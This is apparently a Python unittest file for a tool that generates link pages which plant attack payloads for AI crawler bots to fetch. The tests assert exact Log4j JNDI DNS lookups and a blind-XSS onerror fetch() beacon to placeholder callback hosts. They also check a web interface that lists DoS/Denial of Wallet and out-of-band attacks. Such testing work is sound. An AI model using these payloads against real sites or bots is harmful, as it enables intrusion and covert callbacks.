import argparse
import unittest
from pathlib import Path

from generate import add_payload, make_payload, render_page


class GeneratorTests(unittest.TestCase):
    def test_query_payload_preserves_existing_query(self):
        url = add_payload("https://example.test/x?a=1", "a b", position="query",
                          parameter="poc")
        self.assertEqual(url, "https://example.test/x?a=1&poc=a+b")

    def test_html_is_escaped_and_counted(self):
        args = argparse.Namespace(
            count=2, seed="test", token="token", payload="custom",
            callback="", payload_template='value-<>&-{n}',
            payload_position="query", payload_param="p", text_mode="increment",
            text=['link <{n}>'], random_length=8, title="Test <page>",
        )
        page = render_page(args, ["https://example.test/"])
        self.assertEqual(page.count("<li>"), 2)
        self.assertIn("Test &lt;page&gt;", page)
        self.assertIn("link &lt;1&gt;", page)
        self.assertNotIn('href="https://example.test/?p=value-<', page)

    def test_log4j_preset_is_dns_only(self):
        payload = make_payload("log4j-dns", n=1, target="https://example.test",
                               token="t", callback="dns.example.test", custom=None)
        self.assertEqual(payload, "${jndi:dns://dns.example.test/ai-bot-poc-t-1}")

    def test_blind_xss_preset_runs_only_a_callback_beacon(self):
        payload = make_payload("blind-xss", n=2, target="https://example.test",
                               token="test token", callback="http://callback.example.test/base/",
                               custom=None)
        self.assertEqual(
            payload,
            '\"><img src=x onerror="this.onerror=null;fetch('
            "'http://callback.example.test/base/ai-bot-poc/test%20token/2',"
            "{mode:'no-cors'})\">",
        )

    def test_log4j_uses_only_the_hostname_from_a_callback_url(self):
        payload = make_payload("log4j-dns", n=3, target="https://example.test",
                               token="t", callback="https://dns.example.test/a/",
                               custom=None)
        self.assertEqual(payload, "${jndi:dns://dns.example.test/ai-bot-poc-t-3}")

    def test_static_web_interface_has_safety_cap_and_download(self):
        source = (Path(__file__).parent.parent / "index.html").read_text(encoding="utf-8")
        self.assertIn('id="count" type="number" min="1" max="1000"', source)
        self.assertNotIn('id="authorized"', source)
        self.assertIn('id="download"', source)
        self.assertIn("URL.createObjectURL", source)
        self.assertIn("<h2>DoS / Denial of Wallet</h2>", source)
        self.assertIn("<h2>OOB attacks</h2>", source)
        self.assertIn("callback.required = needsCallback", source)


if __name__ == "__main__":
    unittest.main()
